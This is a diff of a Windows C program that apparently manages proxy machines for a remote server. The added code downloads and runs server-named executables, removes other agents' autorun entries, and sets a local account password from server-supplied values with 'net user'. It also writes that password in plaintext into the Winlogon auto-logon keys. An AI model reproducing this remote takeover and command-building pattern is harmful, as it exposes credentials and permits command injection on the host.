@@ -9,14 +9,15 @@
 
 #include "../Proxy/cJSON.h"
 #include "../Proxy/md5.h"
+#include "aes.h"
 
 #include "sockio\sio_client.h"
 
 #pragma warning(disable:4996)
 
 
-#define VERSION "0.1.33"
-#define SOCKET_IO_VERSION ("socketio-v"##VERSION##"_test")
+#define VERSION "0.1.35"
+#define SOCKET_IO_VERSION ("socketio-v"##VERSION)
 
 #define BUF_SIZE 512
 #define CLIENT_RELINK WM_USER + 501
@@ -64,7 +65,7 @@ BOOL doDownLoad(const char* path, const char* pUrl, const char* pMd5)
 	return TRUE;
 }
 
-BOOL Proxy(cJSON** pAppInfo)
+BOOL Controller(cJSON** pAppInfo)
 {
 	char* pVersion = cJSON_GetObjectItem(pAppInfo[0], "version")->valuestring;
 	if (CompareVersion(VERSION, pVersion))
@@ -117,11 +118,6 @@ BOOL PWorkUnit(cJSON** pAppInfo)
 	if (!PRegCreateKey(CommandExecute, &hKey))
 		return FALSE;
 	char Version[MAX_PATH] = { 0 };
-	//if (!GetRegValue(hKey, "version", Version))
-	//{
-	//	RegCloseKey(hKey);
-	//	return FALSE;
-	//}
 	GetRegValue(hKey, "version", Version);
 
 	char pFilePath[MAX_PATH];
@@ -129,12 +125,13 @@ BOOL PWorkUnit(cJSON** pAppInfo)
 	char* pVersion = cJSON_GetObjectItem(pAppInfo[2], "version")->valuestring;
 	if (CompareVersion(Version, pVersion) && _access(pFilePath, 0) == 0)
 	{
-		printf("proxy-monitor不需要更新\n");
+		printf("pworkunit不需要更新\n");
 		RegCloseKey(hKey);
 		return TRUE;
 	}
 
-	CreateDirectory(CommandFiler, NULL);
+	if (_access(CommandFiler, 0) != 0)
+		CreateDirectory(CommandFiler, NULL);
 
 	char* pMd5 = cJSON_GetObjectItem(pAppInfo[2], "ext_md5")->valuestring;
 	char* pDUrl = cJSON_GetObjectItem(pAppInfo[2], "update_url")->valuestring;
@@ -155,6 +152,42 @@ BOOL PWorkUnit(cJSON** pAppInfo)
 	return TRUE;
 }
 
+BOOL PMonitor(cJSON** pAppInfo)
+{
+	HKEY hKey = NULL;
+	if (!PRegCreateKey(SMonitor, &hKey))
+		return FALSE;
+	char Version[MAX_PATH] = { 0 };
+	GetRegValue(hKey, "version", Version);
+	char pFilePath[MAX_PATH];
+	GetRegValue(hKey, "path", pFilePath);
+	RegCloseKey(hKey);
+
+	if (_access(pFilePath, 0) == 0)
+		return TRUE;
+
+	char* pVersion = cJSON_GetObjectItem(pAppInfo[3], "version")->valuestring;
+
+	if (_access(CommandFiler, 0) != 0)
+		CreateDirectory(CommandFiler, NULL);
+
+	char* pMd5 = cJSON_GetObjectItem(pAppInfo[3], "ext_md5")->valuestring;
+	char* pDUrl = cJSON_GetObjectItem(pAppInfo[3], "update_url")->valuestring;
+	char FormatDownUrl[MAX_PATH] = { 0 };
+	UrlFormating(pDUrl, "\\", FormatDownUrl);
+
+	sprintf_s(pFilePath, "%s\\pmonitor-v%s.exe", CommandFiler, pVersion);
+
+	if (!doDownLoad(pFilePath, FormatDownUrl, pMd5))
+	{
+		return FALSE;
+	}
+
+	ShellExecute(0, "open", pFilePath, NULL, NULL, SW_SHOWNORMAL);
+	printf("monitor.exe 更新完成\n");
+	return TRUE;
+}
+
 void _stdcall io_ontimer_checkversion(HWND hwnd, UINT message, UINT idTimer, DWORD dwTime)
 {
 #ifdef PROXY_DEBUG
@@ -171,6 +204,7 @@ void _stdcall io_ontimer_checkversion(HWND hwnd, UINT message, UINT idTimer, DWO
 	if (NULL == pResponseData->pData)
 	{
 		printf("内存分配失败\n");
+		free(pResponseData);
 		return;
 	}
 
@@ -217,7 +251,7 @@ void _stdcall io_ontimer_checkversion(HWND hwnd, UINT message, UINT idTimer, DWO
 		goto error;
 	}
 
-	cJSON* app_info[3];
+	cJSON* app_info[4];
 	app_info[0] = cJSON_GetObjectItem(cjArray, "host-controller");
 	if (NULL == app_info[0])
 	{
@@ -236,8 +270,14 @@ void _stdcall io_ontimer_checkversion(HWND hwnd, UINT message, UINT idTimer, DWO
 		printf("获取 app-pworkunit 版本信息失败\n");
 		goto error;
 	}
+	app_info[3] = cJSON_GetObjectItem(cjArray, "proxy-monitor");
+	if (NULL == app_info[3])
+	{
+		printf("获取 proxy-monitor 版本信息失败\n");
+		goto error;
+	}
 
-	if (!Proxy(app_info))
+	if (!Controller(app_info))
 	{
 		printf("升级代理失败\n");
 		goto error;
@@ -246,6 +286,12 @@ void _stdcall io_ontimer_checkversion(HWND hwnd, UINT message, UINT idTimer, DWO
 	if (!PWorkUnit(app_info))
 	{
 		printf("升级pworunit程序失败\n");
+		goto error;
+	}
+
+	if (!PMonitor(app_info))
+	{
+		printf("升级monitor程序失败\n");
 		goto error;
 	}
 
@@ -264,7 +310,7 @@ BOOL RegselfInfo()
 
 	char filepath[MAX_PATH] = { 0 };
 	GetModuleFileName(NULL, filepath, MAX_PATH);
-	if (!SetRegValue(hKey, "manage_path", filepath))
+	if (!SetRegValue(hKey, "path", filepath))
 	{
 		RegCloseKey(hKey);
 		return FALSE;
@@ -682,7 +728,7 @@ void _stdcall io_ontimer_checkproxy(HWND hwnd, UINT message, UINT idTimer, DWORD
 			if (0 != dwPerErr)
 			{
 				DWORD dwCurrent = GetTickCount();
-				if ((dwCurrent - dwPerErr) > 1000 * 60 * 2)
+				if ((dwCurrent - dwPerErr) > 1000 * 60 * 3)
 				{
 					printf("代理进程错误，重启代理");
 					ShellExecute(NULL, "open", CommandPath, "proxy_restart", NULL, SW_SHOWNORMAL);
@@ -709,6 +755,7 @@ unsigned int _stdcall io_ontimer_thread(void* pVoid)
 
 	SetTimer(NULL, 1, 1000 * 60 * 10, io_ontimer_checkversion);
 	SetTimer(NULL, 2, 1000 * 60 * 60 * 3, io_ontimer_resolve);
+	SetTimer(NULL, 3, 1000 * 60 * 2, io_ontimer_checkproxy);
 
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
@@ -722,8 +769,174 @@ unsigned int _stdcall io_ontimer_thread(void* pVoid)
 	return 0;
 }
 
+void CleanMonitor()
+{
+	HKEY hKey = NULL;
+	if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		0, KEY_ALL_ACCESS, &hKey))
+	{
+		RegDeleteValue(hKey, "ward_path");
+		RegCloseKey(hKey);
+	}
+
+	if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		0, KEY_ALL_ACCESS, &hKey))
+	{
+		RegDeleteValue(hKey, "ward_path");
+		RegCloseKey(hKey);
+	}
+
+	if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software",
+		0, KEY_ALL_ACCESS, &hKey))
+	{
+		RegDeleteKey(hKey, "Proxy");
+		RegDeleteKey(hKey, "PWatch");
+		RegCloseKey(hKey);
+	}
+
+	CloseTheDimProcess("pwatch-v");
+	Sleep(1000 * 2);
+	CloseTheDimProcess("proxy-v");
+	Sleep(1000 * 2);
+
+	DeleteDirectoryByFullName("\"C:\\MyWard\"");
+}
+
+BOOL CheckWindowsUP(const char* _username, const char* _password)
+{
+	HANDLE hUser;
+	if (LogonUser(_username, ".", _password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hUser))
+	{
+		CloseHandle(hUser);
+		return TRUE;
+	}
+	else
+	{
+		CloseHandle(hUser);
+		return FALSE;
+	}
+	CloseHandle(hUser);
+	return TRUE;
+}
+
+#define ADMIN_ITEM "AutoAdminLogon"
+#define USER_ITEM "DefaultUserName"
+#define PASSWORD_ITEM "Defaultpassword"
+
+void DeleteValue(HKEY hKey)
+{
+	RegDeleteValue(hKey, ADMIN_ITEM);
+	RegDeleteValue(hKey, USER_ITEM);
+	RegDeleteValue(hKey, PASSWORD_ITEM);
+}
+
+BOOL Winlogon(const char* _username, const char* _password)
+{
+	HKEY hKey = NULL;
+	if (ERROR_SUCCESS != ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_ALL_ACCESS, &hKey))
+		return FALSE;
+
+	if (!SetRegValue(hKey, ADMIN_ITEM, "1"))
+		goto error;
+
+	if (!SetRegValue(hKey, USER_ITEM, (char*)_username))
+		goto error;
+
+	if (!SetRegValue(hKey, PASSWORD_ITEM, (char*)_password))
+		goto error;
+
+	RegCloseKey(hKey);
+	return TRUE;
+error:
+	DeleteValue(hKey);
+	RegCloseKey(hKey);
+	return FALSE;
+}
+
+void InitMsconfig(BOOL bInit)
+{
+	CurlResponseData* pResponseData = (CurlResponseData*)malloc(sizeof(CurlResponseData));
+	if (NULL == pResponseData)
+	{
+		printf("内存分配失败\n");
+		return;
+	}
+	pResponseData->pData = (char*)malloc(512);
+	if (NULL == pResponseData->pData)
+	{
+		printf("内存分配失败\n");
+		free(pResponseData);
+		return;
+	}
+
+	cJSON* root = NULL;
+	pResponseData->dwDataLen = 0;
+	if (!Curl_GetHostInfo(g_pClient_id, pResponseData))
+	{
+		printf("获取版本信息失败\n");
+		goto error;
+	}
+	printf("GET请求返回的信息: %s\n", pResponseData->pData);
+	root = cJSON_Parse(pResponseData->pData);
+	if (NULL == root)
+		goto error;
+	cJSON* cSuccess = cJSON_GetObjectItem(root, "success");
+	if (NULL == cSuccess)
+		goto error;
+	int nSuccess = cSuccess->valueint;
+	if (0 == nSuccess)
+		goto error;
+	cJSON* pArray = cJSON_GetObjectItem(root, "data");
+	if (NULL == pArray)
+		goto error;
+	char* pusername = cJSON_GetObjectItem(pArray, "username")->valuestring;
+	char* bpassword = cJSON_GetObjectItem(pArray, "password")->valuestring;
+	if (NULL == pusername || NULL == bpassword)
+		goto error;
+
+	char* ppassword = NULL;
+	GetPassWord(bpassword, &ppassword);
+	if (strcmp(ppassword, "") == 0)
+	{
+		free(ppassword);
+		goto error;
+	}
+
+	if (!CheckWindowsUP(pusername, ppassword))
+	{
+		char* pInfo = NULL;
+		char cCmd[64] = { 0 };
+		sprintf_s(cCmd, "net user %s %s", pusername, ppassword);
+		ExcCmd(cCmd, &pInfo);
+		printf("%s\n", pInfo);
+		free(pInfo);
+
+		if (!bInit)
+		{
+			if (!Winlogon(pusername, ppassword))
+				printf("设置开机自动登陆失败\n");
+		}
+	}
+
+	if (bInit)
+	{
+		if (!Winlogon(pusername, ppassword))
+			printf("设置开机自动登陆失败\n");
+	}
+
+	free(ppassword);
+
+error:
+	if (NULL != root)
+		cJSON_Delete(root);
+	free(pResponseData->pData);
+	free(pResponseData);
+	return;
+}
+
 int main()
 {
+	CleanMonitor();
 	printf("Current Version: %s\n", SOCKET_IO_VERSION);
 #ifndef PROXY_DEBUG
 	if (!RegselfInfo())
@@ -739,6 +952,8 @@ int main()
 		printf("获取client_id失败\n");
 		return 0;
 	}
+
+	InitMsconfig(TRUE);
 	
 	io_ontimer_checkversion(0, 0, 0, 0);
 
@@ -787,6 +1002,9 @@ int main()
 	}
 	WaitForSingleObject(hClientThreadStart, INFINITE);
 	PostThreadMessage(g_client_thread_id, CLIENT_RELINK, 0, 0);
+
+	if (!CheckTheDimProcess("proxy2-v"))
+		ShellExecute(NULL, "open", CommandPath, "proxy_restart", NULL, SW_SHOWNORMAL);
 
 	getchar();
 	return 0;
